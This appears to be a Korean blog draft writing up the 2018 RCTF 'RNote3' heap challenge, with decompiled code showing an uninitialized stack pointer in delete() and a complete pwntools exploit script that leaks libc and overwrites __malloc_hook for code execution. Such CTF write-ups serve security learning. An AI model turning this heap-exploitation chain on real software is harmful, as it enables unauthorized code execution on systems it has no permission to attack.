---
title: "2018 RCTF RNote3"
date: 2020-3-6
ctf: RCTF
layout: post
published : false
---



ptr이라는 변수를 초기화해주지 않고 있어서 `uninitailize stack` 이 발생한다.

```c
unsigned __int64 delete()
{
  size_t v0; // rdx
  signed int i; // [rsp+4h] [rbp-1Ch]
  void **ptr; // [rsp+8h] [rbp-18h]
  char s1; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("please input note title: ");
  read_(&s1, &byte_8, v0);
  for ( i = 0; i <= 31; ++i )
  {
    if ( note2[i] && !strncmp(&s1, note2[i], 8uLL) )
    {
      ptr = note2[i];
      break;
    }
  }
  if ( ptr )
  {
    free(ptr[2]);
    free(ptr);
    note2[i] = 0LL;
  }
  else
  {
    puts("not a valid title");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

자세히보면 view, edit, delete 함수 모두 같은 스택 구조를 가지고 있다. 근데 delete함수에서는 ptr값을 초기화해주지 않는다. 그러므로 `uninitailize stack` 취약점이 터진다. 그래서 delete 함수에서 힙포인터를 담고 있는 전역변수를 0으로 초기화 시키지 않을 수 있다. 이런식으로 unsorted bin attack으로 libc leak해주고 UAF로 fd에 __malloc_hook - 35를 넣고 이후 청크 하나 생성하고 또 하나 생성해서 hook 덮어주면 된다. 그리고 Double Free로 트리거해주면 된다. 

> exploit.py

```python
from pwn import *

# context.log_level = 'debug'
e = ELF('./RNote3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./RNote3',aslr=True)
sl = lambda x : p.sendline(x)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
note = 0x0000000000202040
note2 = 0x0000000000202060

def add(title,size,content):
	sl('1')
	sa('please input title:',title)
	sla('please input content size:',str(size))
	sa('please input content:',content)

def view(title):
	sl('2')
	sa('please input note title: ',title)

def edit(title,content):
	sl('3')
	sa('please input note title:',title)
	sa('please input new content: ',content)

def delete(title):
	sl('4')
	sa('please input note title: ',title)

add('A\n',0xa0,'a\n') 
add('B\n',0xa0,'b\n')

view('A\n') 
delete('!\n') # uninitailize stack
view('\n')

p.recvuntil('content: ')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x3c4b78
log.info('libc_base : {}'.format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook : {}'.format(hex(malloc_hook)))

add('C\n',0xa0,'c\n')
add('D\n',0x68,'d\n')
add('E\n',0x68,'e\n')

view('D\n')
delete('!\n') # uninitailize stack
edit('\n',p64(malloc_hook-35)+'\n')

add('F\n',0x68,'f\n')
add('G\n',0x68,'A'*19+p64(libc_base + 0xf02a4)+'\n')

delete('E\n')
delete('E\n')

p.interactive()
```

